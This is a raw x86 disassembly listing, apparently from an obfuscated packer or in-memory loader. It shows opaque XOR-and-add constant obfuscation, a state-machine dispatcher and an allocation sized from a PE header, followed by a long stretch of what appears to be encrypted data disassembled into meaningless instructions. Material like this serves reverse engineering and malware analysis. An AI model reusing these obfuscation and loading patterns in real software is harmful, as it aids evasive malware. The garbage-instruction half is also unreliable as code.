  41531c:	jne    0x41532e
  41531e:	lea    eax,[ebp-0x4c]
  415321:	push   eax
  415322:	call   0x414de8
  415327:	mov    ecx,DWORD PTR [ebp-0x44]
  41532a:	cmp    eax,ecx
  41532c:	je     0x415338
  41532e:	mov    eax,DWORD PTR [ebp+0x8]
  415331:	xor    eax,edi
  415333:	add    eax,ebx
  415335:	mov    DWORD PTR [ebp+0x18],eax
  415338:	mov    eax,DWORD PTR [ebp-0x8]
  41533b:	xor    eax,edi
  41533d:	lea    eax,[eax+esi*1+0x3272dd]
  415344:	xor    eax,edi
  415346:	mov    ecx,DWORD PTR [ebp+0x8]
  415349:	mov    edx,DWORD PTR [ebp+0x18]
  41534c:	xor    ecx,edi
  41534e:	add    ecx,ebx
  415350:	cmp    edx,ecx
  415352:	je     0x41514f
  415358:	mov    eax,DWORD PTR [ebp+0x8]
  41535b:	mov    ecx,DWORD PTR [ebp+0x18]
  41535e:	xor    eax,edi
  415360:	add    eax,ebx
  415362:	cmp    ecx,eax
  415364:	jne    0x415377
  415366:	mov    eax,DWORD PTR [ebp-0x8]
  415369:	mov    ecx,DWORD PTR [ebp+0x1c]
  41536c:	xor    eax,edi
  41536e:	lea    eax,[eax+ecx*1+0x3272dd]
  415375:	jmp    0x4153ee
  415377:	push   0x18
  415379:	push   DWORD PTR [ebp-0x4]
  41537c:	lea    eax,[ebp-0x64]
  41537f:	push   eax
  415380:	call   0x414620
  415385:	mov    eax,DWORD PTR [ebp+0x8]
  415388:	mov    ecx,DWORD PTR [ebp-0x18]
  41538b:	xor    eax,edi
  41538d:	add    eax,ebx
  41538f:	cmp    eax,ecx
  415391:	je     0x4153a6
  415393:	mov    eax,DWORD PTR [ebp+0x8]
  415396:	xor    eax,edi
  415398:	add    eax,ebx
  41539a:	push   eax
  41539b:	push   0x18
  41539d:	lea    eax,[ebp-0x64]
  4153a0:	push   eax
  4153a1:	call   0x414b97
  4153a6:	mov    eax,DWORD PTR [ebp-0x4]
  4153a9:	add    eax,0x18
  4153ac:	mov    DWORD PTR [ebp+0x18],eax
  4153af:	push   DWORD PTR [ebp-0x50]
  4153b2:	push   DWORD PTR [ebp+0x18]
  4153b5:	mov    eax,DWORD PTR [ebp-0x54]
  4153b8:	add    eax,DWORD PTR [ebp-0x20]
  4153bb:	push   eax
  4153bc:	call   0x414620
  4153c1:	mov    eax,DWORD PTR [ebp+0x8]
  4153c4:	mov    ecx,DWORD PTR [ebp-0x18]
  4153c7:	xor    eax,edi
  4153c9:	add    eax,ebx
  4153cb:	cmp    eax,ecx
  4153cd:	je     0x4153e0
  4153cf:	push   0x0
  4153d1:	push   DWORD PTR [ebp-0x50]
  4153d4:	mov    eax,DWORD PTR [ebp-0x54]
  4153d7:	add    eax,DWORD PTR [ebp-0x20]
  4153da:	push   eax
  4153db:	call   0x414b97
  4153e0:	mov    eax,DWORD PTR [ebp-0x24]
  4153e3:	mov    ecx,DWORD PTR [ebp-0x50]
  4153e6:	add    DWORD PTR [eax],ecx
  4153e8:	mov    eax,DWORD PTR [ebp-0x50]
  4153eb:	add    eax,DWORD PTR [ebp+0x1c]
  4153ee:	mov    DWORD PTR [ebp+0x1c],eax
  4153f1:	mov    eax,DWORD PTR [ebp-0x8]
  4153f4:	mov    ecx,DWORD PTR [ebp+0x1c]
  4153f7:	xor    eax,edi
  4153f9:	add    eax,ebx
  4153fb:	imul   eax,ecx
  4153fe:	mov    ecx,DWORD PTR [ebp+0x8]
  415401:	mov    edx,DWORD PTR [ebp-0x28]
  415404:	xor    ecx,edi
  415406:	lea    ecx,[ecx+edx*1+0x3272dd]
  41540d:	cmp    eax,ecx
  41540f:	jb     0x41506c
  415415:	mov    esi,DWORD PTR [ebp+0x14]
  415418:	mov    eax,DWORD PTR [ebp-0x20]
  41541b:	mov    DWORD PTR [esi],eax
  41541d:	jmp    0x415464
  41541f:	mov    ecx,DWORD PTR [ebp+0x8]
  415422:	mov    edx,DWORD PTR [ebp+0xc]
  415425:	xor    ecx,edi
  415427:	xor    edx,edi
  415429:	add    ecx,ebx
  41542b:	add    edx,ebx
  41542d:	cmp    ecx,edx
  41542f:	jne    0x415443
  415431:	mov    eax,ds:0x7f642d1c
  415436:	imul   eax,eax,0x9f15fcef
  41543c:	mov    ds:0x7f642d1c,eax
  415441:	jmp    0x415464
  415443:	mov    ecx,DWORD PTR [ebp+0x8]
  415446:	xor    ecx,edi
  415448:	add    ecx,ebx
  41544a:	cmp    eax,ecx
  41544c:	je     0x41545a
  41544e:	sub    DWORD PTR ds:0xf861e3c,0x709beac4
  415458:	jmp    0x415464
  41545a:	and    DWORD PTR ds:0x3343fa1c,0x5265ec3f
  415464:	pop    edi
  415465:	pop    esi
  415466:	pop    ebx
  415467:	leave  
  415468:	ret    0x18
  41546b:	push   ebp
  41546c:	mov    ebp,esp
  41546e:	and    esp,0xfffffff8
  415471:	mov    eax,DWORD PTR [ebp+0x20]
  415474:	sub    esp,0x14
  415477:	push   ebx
  415478:	mov    ebx,DWORD PTR [ebp+0x14]
  41547b:	push   esi
  41547c:	push   edi
  41547d:	cmp    eax,0xf89c85b5
  415482:	jne    0x41548e
  415484:	push   0xf89c85b2
  415489:	jmp    0x4155c0
  41548e:	mov    eax,DWORD PTR [ebp+0x20]
  415491:	cmp    eax,0xf89c85b2
  415496:	jne    0x4154a2
  415498:	push   0xf89c85b3
  41549d:	jmp    0x4155c0
  4154a2:	mov    eax,DWORD PTR [ebp+0x20]
  4154a5:	cmp    eax,0xf89c85b3
  4154aa:	jne    0x4154b6
  4154ac:	push   0xf89c85b0
  4154b1:	jmp    0x4155c0
  4154b6:	mov    eax,DWORD PTR [ebp+0x20]
  4154b9:	cmp    eax,0xf89c85b0
  4154be:	jne    0x4154ca
  4154c0:	push   0xf89c85b1
  4154c5:	jmp    0x4155c0
  4154ca:	mov    ecx,DWORD PTR [ebp+0x20]
  4154cd:	mov    eax,0xf89c85bc
  4154d2:	cmp    ecx,eax
  4154d4:	jne    0x415590
  4154da:	mov    eax,DWORD PTR [ebp+0x10]
  4154dd:	mov    DWORD PTR [esp+0xc],eax
  4154e1:	mov    eax,DWORD PTR [ebp+0x18]
  4154e4:	mov    DWORD PTR [esp+0x14],eax
  4154e8:	mov    eax,DWORD PTR [ebp+0xc]
  4154eb:	mov    DWORD PTR [esp+0x18],eax
  4154ef:	mov    eax,DWORD PTR [ebp+0x8]
  4154f2:	mov    DWORD PTR [esp+0x10],eax
  4154f6:	mov    eax,DWORD PTR [esp+0x10]
  4154fa:	mov    ecx,DWORD PTR [esp+0x14]
  4154fe:	mov    edi,0x7510896
  415503:	xor    eax,edi
  415505:	mov    esi,0x3272dd
  41550a:	add    eax,esi
  41550c:	mov    DWORD PTR [ecx],eax
  41550e:	mov    eax,DWORD PTR [esp+0xc]
  415512:	mov    eax,DWORD PTR [eax+0x194]
  415518:	mov    ecx,DWORD PTR [eax]
  41551a:	mov    eax,DWORD PTR [esp+0xc]
  41551e:	mov    eax,DWORD PTR [eax+0x194]
  415524:	mov    eax,DWORD PTR [eax]
  415526:	add    eax,DWORD PTR [ecx+0x3c]
  415529:	mov    ecx,DWORD PTR [esp+0xc]
  41552d:	mov    ecx,DWORD PTR [ecx+0x1d8]
  415533:	mov    ecx,DWORD PTR [ecx+0x14]
  415536:	push   0x4
  415538:	push   0x3000
  41553d:	push   DWORD PTR [eax+0x50]
  415540:	push   0x0
  415542:	call   ecx
  415544:	mov    DWORD PTR [ebx],eax
  415546:	mov    eax,DWORD PTR [esp+0x10]
  41554a:	push   DWORD PTR [esp+0xc]
  41554e:	xor    eax,edi
  415550:	add    eax,esi
  415552:	mov    DWORD PTR [esp+0x20],eax
  415556:	lea    eax,[esp+0x20]
  41555a:	push   eax
  41555b:	push   ebx
  41555c:	push   DWORD PTR [esp+0x20]
  415560:	push   DWORD PTR [esp+0x28]
  415564:	push   DWORD PTR [esp+0x24]
  415568:	call   0x414f2c
  41556d:	mov    eax,DWORD PTR [esp+0x10]
  415571:	mov    ecx,DWORD PTR [ebx]
  415573:	xor    eax,edi
  415575:	add    eax,esi
  415577:	cmp    ecx,eax
  415579:	je     0x4155d7
  41557b:	mov    eax,DWORD PTR [esp+0x18]
  41557f:	mov    ecx,DWORD PTR [esp+0x14]
  415583:	xor    eax,edi
  415585:	add    eax,esi
  415587:	imul   eax,DWORD PTR [esp+0x1c]
  41558c:	mov    DWORD PTR [ecx],eax
  41558e:	jmp    0x4155d7
  415590:	mov    ecx,DWORD PTR [ebp+0x20]
  415593:	cmp    ecx,0xf89c85b1
  415599:	jne    0x4155a2
  41559b:	push   0xf89c85be
  4155a0:	jmp    0x4155c0
  4155a2:	mov    ecx,DWORD PTR [ebp+0x20]
  4155a5:	cmp    ecx,0xf89c85be
  4155ab:	jne    0x4155b4
  4155ad:	push   0xf89c85bf
  4155b2:	jmp    0x4155c0
  4155b4:	mov    ecx,DWORD PTR [ebp+0x20]
  4155b7:	cmp    ecx,0xf89c85bf
  4155bd:	jne    0x4155d7
  4155bf:	push   eax
  4155c0:	push   DWORD PTR [ebp+0x1c]
  4155c3:	push   DWORD PTR [ebp+0x18]
  4155c6:	push   ebx
  4155c7:	push   DWORD PTR [ebp+0x10]
  4155ca:	push   DWORD PTR [ebp+0xc]
  4155cd:	push   DWORD PTR [ebp+0x8]
  4155d0:	call   0x41546b
  4155d5:	mov    DWORD PTR [ebx],eax
  4155d7:	mov    eax,DWORD PTR [ebx]
  4155d9:	pop    edi
  4155da:	pop    esi
  4155db:	pop    ebx
  4155dc:	mov    esp,ebp
  4155de:	pop    ebp
  4155df:	ret    0x1c
  4155e2:	push   ebp
  4155e3:	mov    ebp,esp
  4155e5:	sub    esp,0xc
  4155e8:	mov    eax,0xf89c85b5
  4155ed:	mov    DWORD PTR [ebp-0x8],eax
  4155f0:	mov    DWORD PTR [ebp-0xc],0xf89c85b2
  4155f7:	mov    ecx,DWORD PTR [ebp-0x8]
  4155fa:	xor    ecx,0x7510896
  415600:	add    ecx,0x3272dd
  415606:	mov    DWORD PTR [ebp-0x4],ecx
  415609:	mov    ecx,DWORD PTR [ebp+0xc]
  41560c:	push   eax
  41560d:	mov    DWORD PTR [ebp+0xc],ecx
  415610:	push   DWORD PTR [ebp+0xc]
  415613:	lea    eax,[ebp-0x4]
  415616:	push   DWORD PTR [ebp+0x8]
  415619:	push   eax
  41561a:	push   DWORD PTR [ebp+0xc]
  41561d:	push   DWORD PTR [ebp-0xc]
  415620:	push   DWORD PTR [ebp-0x8]
  415623:	call   0x41546b
  415628:	mov    DWORD PTR [ebp-0x4],eax
  41562b:	mov    eax,DWORD PTR [ebp-0x4]
  41562e:	leave  
  41562f:	ret    0x8
  415632:	mov    cl,0x27
  415634:	popa   
  415635:	test   bh,dh
  415637:	(bad)  
  415638:	cmc    
  415639:	aaa    
  41563a:	push   ss
  41563b:	shr    BYTE PTR [edi],0x1f
  41563e:	js     0x415639
  415640:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415641:	sar    BYTE PTR [ecx-0x2c],1
  415644:	add    BYTE PTR [eax],al
  415646:	hlt    
  415647:	add    al,0x0
  415649:	add    BYTE PTR ds:0x857a4979,ch
  41564f:	fwait
  415650:	push   0xdec7c2ad
  415655:	rcr    DWORD PTR [ebp-0x43816ecd],1
  41565b:	outs   dx,BYTE PTR ds:[esi]
  41565c:	das    
  41565d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41565e:	fs pop ebp
  415660:	outs   dx,DWORD PTR ds:[esi]
  415661:	add    BYTE PTR [eax+0x62a10685],dl
  415667:	in     al,0x68
  415669:	cli    
  41566a:	jmp    0x5cdc1bac
  41566f:	inc    eax
  415670:	js     0x4156d4
  415672:	repnz sbb BYTE PTR ds:0xb66ca980,0x75
  41567a:	push   ebx
  41567b:	mov    al,0x3b
  41567d:	(bad)  
  41567f:	mov    ch,0x3c
  415681:	call   0x465a:0x8828c367
  415688:	mov    BYTE PTR [ebx+ebp*4+0x1a],ah
  41568c:	out    0x5a,al
  41568e:	call   FWORD PTR [eax+0x3b]
  415691:	mov    ecx,0x41dec3f5
  415696:	and    BYTE PTR [edi],al
  415698:	pop    edx
  415699:	lods   eax,DWORD PTR ds:[esi]
  41569a:	test   DWORD PTR [edi],edx
  41569c:	pop    esp
  41569d:	pop    ss
  41569e:	ins    BYTE PTR es:[edi],dx
  41569f:	sbb    bh,cl
  4156a1:	push   ebx
  4156a2:	xchg   esi,eax
  4156a3:	retf   0x487f
  4156a6:	cmp    al,BYTE PTR ds:0x799eded5
  4156ac:	lea    esi,ds:0x1e34a97c
  4156b2:	ret    
  4156b3:	arpl   ax,si
  4156b5:	sbb    edi,DWORD PTR [ecx+0x2281acb7]
  4156bb:	mov    edi,DWORD PTR [esi-0x68]
  4156be:	fs push eax
  4156c0:	or     cl,BYTE PTR [esi+esi*2-0x36599cdf]
  4156c7:	in     al,dx
  4156c8:	jle    0x4156cc
  4156ca:	hlt    
  4156cb:	es xchg ebx,eax
  4156cd:	sub    BYTE PTR [ebp-0x30],cl
  4156d0:	or     dl,BYTE PTR [esi+0x18]
  4156d3:	or     al,0xf1
  4156d5:	xor    al,0xf3
  4156d7:	or     ah,BYTE PTR [ecx+0x2a]
  4156da:	out    dx,eax
  4156db:	lods   al,BYTE PTR ds:[esi]
  4156dc:	xchg   ebp,eax
  4156dd:	push   0x32
  4156df:	into   
  4156e0:	jne    0x415741
  4156e2:	mov    WORD PTR [ecx+0x20e5bdba],?
  4156e8:	jne    0x415721
  4156ea:	pop    eax
  4156eb:	lods   al,BYTE PTR ds:[esi]
  4156ec:	inc    esp
  4156ed:	cdq    
  4156ee:	mov    ah,ch
  4156f0:	shr    BYTE PTR [eax+0x7a],1
  4156f3:	hlt    
  4156f4:	mov    esp,0xad5e812e
  4156f9:	ja     0x4156fd
  4156fb:	sub    BYTE PTR [ebx+esi*4],bl
  4156fe:	and    BYTE PTR [esi+0x2],bl
  415701:	jp     0x41576a
  415703:	lds    edi,FWORD PTR [esp+esi*8+0x2b8da330]
  41570a:	and    DWORD PTR [edx-0xd4d1f8a],0x63
  415711:	mov    esi,0x22f1fa5e
  415716:	sub    eax,0xd3a1ccd5
  41571b:	xchg   ebp,eax
  41571c:	mov    al,0x95
  41571e:	dec    esi
  41571f:	std    
  415720:	jl     0x4156a7
  415722:	dec    ecx
  415723:	int3   
  415724:	push   ebp
  415725:	out    0x17,eax
  415727:	dec    ecx
  415728:	fadd   st(3),st
  41572a:	cmp    DWORD PTR [ebx],0x68aa9c
  415730:	cli    
  415731:	shl    cl,0x7
  415734:	gs jecxz 0x415711
  415737:	add    bh,BYTE PTR [esi]
  415739:	sbb    al,0xd4
  41573b:	cmp    esp,DWORD PTR [ecx-0x53]
  41573e:	mov    edx,0xe45d98c7
  415743:	in     al,0x30
  415745:	bound  esi,QWORD PTR [edi-0x8]
  415748:	cs int 0xcf
  41574b:	dec    ecx
  41574c:	dec    esp
  41574d:	cmp    edx,DWORD PTR [ebx+0x64]
  415750:	inc    esi
  415751:	and    ah,BYTE PTR [ecx+0x1b]
  415754:	sahf   
  415755:	(bad)  
  415757:	cmp    DWORD PTR [ecx-0x2e],ebx
  41575a:	popf   
  41575b:	sar    BYTE PTR [eax+0x2f],cl
  41575e:	inc    eax
  41575f:	in     eax,0xf9
  415761:	cli    
  415762:	or     ebp,eax
  415764:	int3   
  415765:	in     al,dx
  415766:	jns    0x415723
  415768:	mov    edi,0xea27fa96
  41576d:	mov    ds:0x8780855b,eax
  415772:	jge    0x4157cc
  415774:	jmp    0x81ae:0x8343eae6
  41577b:	cmp    eax,DWORD PTR [esi]
  41577d:	inc    ebp
  41577e:	pop    esi
  41577f:	daa    
  415780:	cdq    
  415781:	lds    edx,FWORD PTR fs:[edi+0x53]
  415785:	and    eax,DWORD PTR [eax]
  415787:	pop    ebp
  415788:	fucomi st,st(5)
  41578a:	dec    esp
  41578b:	sub    bh,cl
  41578d:	(bad)  
  41578e:	adc    dh,BYTE PTR [edx+0x2e]
  415791:	(bad)  
  415792:	sbb    ecx,esp
  415794:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415795:	mov    esi,0xb945eb5
  41579a:	push   ss
  41579b:	sbb    eax,0xca26b14f
  4157a0:	sbb    esp,DWORD PTR [esi+0x316c8d79]
  4157a6:	psrad  mm4,QWORD PTR [esp+eax*4-0x4f08a2e2]
  4157ae:	lods   eax,DWORD PTR ds:[esi]
  4157af:	pop    es
  4157b0:	jno    0x4157d3
  4157b2:	and    ecx,ecx
  4157b4:	fidivr DWORD PTR ds:0xc9fbcef7
  4157ba:	inc    edi
  4157bb:	fcmovb st,st(5)
  4157bd:	mov    dl,0x13
  4157bf:	or     esi,esi
  4157c1:	push   ebp
  4157c2:	add    eax,0x54179d7
  4157c7:	cmp    DWORD PTR [edx+0x7],0xffffffa2
  4157cb:	cmp    BYTE PTR [esp+eiz*4-0x7e1d87c3],0x65
  4157d3:	ja     0x4157c7
  4157d5:	push   0xffffffdf
  4157d7:	push   edx
  4157d8:	add    esi,DWORD PTR [eax-0xd]
  4157db:	inc    esp
  4157dc:	mov    ah,0xb7
  4157de:	xchg   esi,esi
  4157e0:	xchg   DWORD PTR [ebx-0x23b2bd46],edi
  4157e6:	pop    esi
  4157e7:	pop    esp
  4157e8:	xor    eax,DWORD PTR [eax]
  4157ea:	sub    eax,0xbcfc730a
  4157ef:	inc    edi
  4157f0:	and    BYTE PTR [ecx],cl
  4157f2:	and    BYTE PTR [ecx-0x592eaeaa],ch
  4157f8:	fadd   QWORD PTR [edi+0x54603ae0]
  4157fe:	sbb    BYTE PTR [ebp+0x28f515fe],ch
  415804:	mov    eax,0xbf6d34fc
  415809:	pushf  
  41580a:	inc    DWORD PTR [esi+0x29]
  41580d:	in     al,0x7
  41580f:	cwde   
  415810:	xor    ebp,DWORD PTR [eax-0x5b]
  415813:	push   0xffffff83
  415815:	mov    bl,0x11
  415817:	sub    ebp,esp
  415819:	(bad)  
  41581b:	pop    ecx
  41581c:	test   al,0x87
  41581e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41581f:	or     eax,0xe41d76d5
  415824:	repnz mov esi,0x901968d2
  41582a:	mov    dl,0x6
  41582c:	aam    0x6
  41582e:	aam    0xca
  415830:	xchg   esi,eax
  415831:	aad    0x4c
  415833:	aad    0x6a
  415835:	mov    al,0x82
  415837:	xchg   esi,eax
  415838:	sub    al,BYTE PTR [ebx]
  41583a:	pop    ss
  41583b:	jg     0x415861
  41583d:	jo     0x415810
  41583f:	dec    edi
  415840:	dec    eax
  415841:	or     ch,BYTE PTR [eax]
  415843:	push   eax
  415844:	pop    DWORD PTR [edi+0x42]
  415847:	(bad)  
  415848:	xor    BYTE PTR [ebx-0x3a8f51c1],dl
  41584e:	jmp    0x415806
  415850:	pop    es
  415851:	ret    0x2e8d
  415854:	jp     0x4157dd
  415856:	sub    DWORD PTR [eax-0x485aeee1],edx
  41585c:	lea    ebp,[ebx+0x31]
  41585f:	sub    DWORD PTR [edi],0xf2d4cdd
  415865:	cmc    
  415866:	fst    DWORD PTR [ebx-0x31]
  415869:	inc    esi
  41586a:	mov    ah,0x36
  41586c:	inc    edi
  41586d:	rcr    ch,cl
  41586f:	sub    eax,0xee0e789c
  415874:	ss push edi
  415876:	loop   0x4157f9
  415878:	or     bl,al
  41587a:	(bad)  
  41587b:	sub    edx,edi
  41587d:	ds in  eax,0xc
  415880:	pop    eax
  415881:	mov    esp,0xcdbf5195
  415886:	xchg   ecx,eax
  415887:	lahf   
  415888:	sub    al,0x77
  41588a:	mov    esp,0xcde50f72
  41588f:	add    bl,BYTE PTR [esi+0x3]
  415892:	adc    al,0x35
  415894:	jmp    0x4158c9
  415896:	pushf  
  415897:	jp     0x41581d
  415899:	dec    edx
  41589a:	stos   DWORD PTR es:[edi],eax
  41589b:	sbb    BYTE PTR [eax],al
  41589d:	ins    DWORD PTR es:[edi],dx
  41589e:	or     BYTE PTR [esi+0x8],cl
  4158a1:	push   0x7876421f
  4158a6:	or     DWORD PTR [edi-0x4f6cbac6],edi
  4158ac:	mov    edi,0xd928097d
  4158b1:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4158b3:	dec    ebx
  4158b4:	cmc    
  4158b5:	adc    al,0x6f
  4158b7:	xchg   cl,bh
  4158b9:	sub    eax,0xaaf7504d
  4158be:	push   cs
  4158bf:	push   es
  4158c0:	loop   0x415921
  4158c2:	mov    ds:0x1b723d07,al
  4158c7:	mov    esi,0x6b660716
  4158cc:	jle    0x4158d4
  4158ce:	pop    ebp
  4158cf:	push   cs
  4158d0:	mov    dl,0xc1
  4158d2:	test   ecx,esp
  4158d4:	push   esi
  4158d5:	imul   ecx,DWORD PTR [eax],0xfffffff6
  4158d8:	jbe    0x415904
  4158da:	fistp  QWORD PTR ds:0xc8557ce6
  4158e0:	fimul  DWORD PTR [edi]
  4158e2:	cmp    esp,DWORD PTR [edi-0x6c293047]
  4158e8:	xor    al,0x98
  4158ea:	or     al,0xcb
  4158ec:	mov    WORD PTR [edi],gs
  4158ee:	mov    dl,0xeb
  4158f0:	fdivr  QWORD PTR [eax]
  4158f2:	daa    
  4158f3:	pop    ss
  4158f4:	and    ecx,esp
  4158f6:	or     al,0xa1
  4158f8:	popa   
  4158f9:	loope  0x41589f
  4158fb:	pop    edi
  4158fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158fd:	cmp    eax,0xf73b0af6
  415902:	loope  0x415950
  415904:	or     al,0xa4
  415906:	scas   al,BYTE PTR es:[edi]
  415907:	test   DWORD PTR [ecx-0x6b3dd46e],ecx
  41590d:	or     DWORD PTR [esi+eiz*2],edi
  415910:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415911:	popa   
  415912:	ret    0x7a4b
  415915:	je     0x4158b7
  415917:	sub    DWORD PTR [ebp-0xf3b11d0],0xc1688229
  415921:	adc    BYTE PTR [esi+0x3bcd4842],dl
  415927:	nop
  415928:	cmp    al,bl
  41592a:	mov    ebp,DWORD PTR [ecx]
  41592c:	dec    ecx
  41592d:	shl    DWORD PTR [esi-0x1bb18704],0xe5
  415934:	dec    ecx
  415935:	sahf   
  415936:	cmp    BYTE PTR [eax],bh
  415938:	inc    edi
  415939:	fs cld 
  41593b:	test   al,0x48
  41593d:	fimul  DWORD PTR [ebp+0x1857f78a]
  415943:	repnz lods eax,DWORD PTR ds:[esi]
  415945:	inc    eax
  415946:	jg     0x415928
  415948:	sbb    al,0xce
  41594a:	sbb    ah,dl
  41594c:	mov    DWORD PTR [ecx],eax
  41594e:	and    edi,esp
  415950:	adc    al,0xae
  415952:	out    dx,eax
  415953:	ins    BYTE PTR es:[edi],dx
  415954:	(bad)  
  415955:	aam    0x65
  415957:	mov    ds:0x25d3739b,eax
  41595c:	clc    
  41595d:	sahf   
  41595e:	inc    esp
  41595f:	sbb    DWORD PTR [ebp+0x3a],esp
  415962:	repnz jecxz 0x4159da
  415965:	dec    edi
  415966:	and    cl,bl
  415968:	adc    DWORD PTR [ebp-0x51],eax
  41596b:	mov    ds:0xa8fadb9c,al
  415970:	fs or  bl,ch
  415973:	mov    fs,WORD PTR [ebp-0x1a]
  415976:	repz rol al,0x12
  41597a:	adc    DWORD PTR [eax],ebp
  41597c:	shl    ecx,1
  41597e:	repz or esp,DWORD PTR [eax-0x17abd77e]
  415985:	imul   esp,DWORD PTR [ecx],0xffffffa0
  415988:	outs   dx,BYTE PTR ds:[esi]
  415989:	cmp    ah,BYTE PTR [eax]
  41598b:	lea    eax,[edi+0x3f]
  41598e:	push   0x2ffee159
  415993:	jne    0x4159c3
  415995:	or     ah,BYTE PTR [ebp+0x68d7a217]
  41599b:	scas   al,BYTE PTR es:[edi]
  41599c:	jbe    0x41594e
  41599e:	cmp    cl,BYTE PTR [ecx-0x2b152cef]
  4159a4:	das    
  4159a5:	fiadd  WORD PTR [edx+0x2e]
  4159a8:	jnp    0x415a01
  4159aa:	in     al,dx
  4159ab:	inc    esi
  4159ac:	jbe    0x4159f3
  4159ae:	lahf   
  4159af:	(bad)  
  4159b0:	mov    cl,0xb7
  4159b2:	cmp    eax,0x2a8f5209
  4159b7:	enter  0x33f1,0x80
  4159bb:	cdq    
  4159bc:	ins    DWORD PTR es:[edi],dx
  4159bd:	push   edx
  4159be:	and    ecx,DWORD PTR [edx+0x5a]
  4159c1:	sbb    DWORD PTR [eax+ebx*4],ebp
  4159c4:	sub    BYTE PTR [ebp+0x52],dl
  4159c7:	aad    0xde
  4159c9:	cs int3 
  4159cb:	and    ebx,DWORD PTR [eax-0x4d0ca653]
  4159d1:	inc    ebx
  4159d2:	rol    DWORD PTR [eax],1
  4159d4:	in     al,0x11
  4159d6:	mov    eax,0xa573d367
  4159db:	in     eax,0xb7
  4159dd:	loop   0x415a3f
  4159df:	in     eax,0xe
  4159e1:	lahf   
  4159e2:	(bad)  
  4159e3:	ins    DWORD PTR es:[edi],dx
  4159e4:	call   0xd90a:0x1cc4288b
  4159eb:	outs   dx,BYTE PTR ds:[esi]
  4159ec:	cdq    
  4159ed:	stc    
  4159ee:	sub    edx,ecx
  4159f0:	xlat   BYTE PTR ds:[ebx]
  4159f1:	xchg   BYTE PTR [edx+0x22],al
  4159f4:	fisttp WORD PTR [edi]
  4159f6:	pop    edi
  4159f7:	or     eax,0x91709d7b
  4159fc:	imul   esp,DWORD PTR [eax+edi*4],0x2a
  415a00:	dec    esp
  415a01:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  415a03:	out    dx,al
  415a04:	cmc    
  415a05:	mov    dh,0x9b
  415a07:	fwait
  415a08:	inc    edi
  415a09:	adc    dl,bh
  415a0b:	out    0x0,eax
  415a0d:	mov    edi,0x98a43927
  415a12:	inc    edi
  415a13:	push   esi
  415a14:	imul   esi,DWORD PTR [edi+ebp*4+0x33b873c1],0xffffffbb
  415a1c:	cmp    bh,BYTE PTR [ebx+0x73a948a8]
  415a22:	jne    0x415aa3
  415a24:	push   es
  415a25:	pushf  
  415a26:	imul   ah
  415a28:	sbb    BYTE PTR [ebx+0x79bb8dbe],al
  415a2e:	js     0x415a46
  415a30:	add    ebp,DWORD PTR [esi-0xe794d4f]
  415a36:	pushf  
  415a37:	sub    al,0xfc
  415a39:	sbb    al,0x7e
  415a3b:	sbb    BYTE PTR [eax-0x67b9f47a],0xc4
  415a42:	mov    ch,0x2a
  415a44:	lock test al,0x78
  415a47:	into   
  415a48:	clc    
  415a49:	stos   DWORD PTR es:[edi],eax
  415a4a:	mov    ds:0x152105a5,eax
  415a4f:	jnp    0x415ab7
  415a51:	sbb    eax,0x4a79ec1b
  415a56:	call   0x24729ea6
  415a5b:	lods   eax,DWORD PTR ds:[esi]
  415a5c:	cmp    al,0xf9
  415a5e:	or     BYTE PTR [edx+ebp*4-0x17756de1],bl
  415a65:	int    0xce
  415a67:	cwde   
  415a68:	daa    
  415a69:	sbb    BYTE PTR [esi],0x95
  415a6c:	adc    DWORD PTR [ecx-0x44],edx
  415a6f:	imul   bx,WORD PTR [edx+0x5f1be48a],0xfff3
  415a77:	cmp    eax,0x397d16d9
  415a7c:	dec    edi
  415a7d:	or     ecx,ecx
  415a7f:	cli    
  415a80:	jns    0x415a71
  415a82:	push   ds
  415a83:	push   esp
  415a84:	mov    ecx,?
  415a86:	mov    edi,0xf0b29ed6
  415a8b:	cld    
  415a8c:	stos   DWORD PTR es:[edi],eax
  415a8d:	xchg   DWORD PTR [edx+0x31],esi
  415a90:	repnz sub BYTE PTR [edi+0x225d8100],ah
  415a97:	div    BYTE PTR [eax+0x35]
  415a9a:	std    
  415a9b:	clc    
  415a9c:	jl     0x415ac8
  415a9e:	ja     0x415aac
  415aa0:	jb     0x415ae9
  415aa2:	fnstenv [eax]
  415aa4:	pushf  
  415aa5:	ret    
  415aa6:	mov    cl,0xbe
  415aa8:	xchg   esp,eax
  415aa9:	sub    DWORD PTR [esi+0x3e],ecx
  415aac:	mov    esp,0x123cec55
  415ab1:	fmul   DWORD PTR ds:0x1f6f7bb3
  415ab7:	jge    0x415aa3
  415ab9:	sti    
  415aba:	pop    ebp
  415abb:	test   eax,0xb0c65497
  415ac0:	xadd   DWORD PTR [edx-0x71f52d5c],edi
  415ac7:	iret   
  415ac8:	jnp    0x415a6d
  415aca:	addr16 je 0x415ab0
  415acd:	xchg   esi,eax
  415ace:	pushf  
  415acf:	ins    BYTE PTR es:[edi],dx
  415ad0:	and    al,0xdb
  415ad2:	cmp    eax,DWORD PTR [ebp+esi*8-0x3779ddc7]
  415ad9:	cmp    esi,edx
  415adb:	mov    ds:0x11f94117,al
  415ae0:	cmovns esp,DWORD PTR [edi]
  415ae3:	mov    BYTE PTR [ebp-0x5b],ah
  415ae6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ae7:	jl     0x415aa5
  415ae9:	adc    BYTE PTR [edi],ah
  415aeb:	jle    0x415a7d
  415aed:	out    0x33,eax
  415aef:	xor    al,0xe5
  415af1:	mov    bl,0xf
  415af3:	cmc    
  415af4:	mov    ds:0x8637432b,al
  415af9:	mov    ebx,0x58863a02
  415afe:	test   cl,dh
  415b00:	dec    eax
  415b01:	loope  0x415b15
  415b03:	leave  
  415b04:	add    BYTE PTR [ebp-0x3b8f9a7a],0x56
  415b0b:	xchg   esi,eax
  415b0c:	xchg   BYTE PTR [esi+edx*4+0x54],dh
  415b10:	cld    
  415b11:	daa    
  415b12:	inc    ebp
  415b13:	mov    ds:0x3aa26f06,al
  415b18:	repnz fistp WORD PTR [esi-0x76]
  415b1c:	sti    
  415b1d:	(bad)
  415b20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
